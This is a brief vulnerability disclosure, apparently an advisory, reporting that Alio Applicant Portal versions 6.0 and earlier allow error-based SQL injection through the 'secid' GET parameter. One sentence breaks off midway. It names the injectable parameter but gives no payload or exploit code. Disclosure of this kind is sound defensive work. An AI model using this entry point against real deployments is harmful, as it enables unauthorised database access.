Alio Applicant Portal versions 6.0 and prior are vulnerable to error-based SQL Injection via the 
'secid' GET parameter failing to properly sanitize inputs. Alio Applicant Portal is used within the

electronically sign up for roles (e.g. a student signing up for particular classes or even in some
cases a teacher or lecturer signing up for a job role)
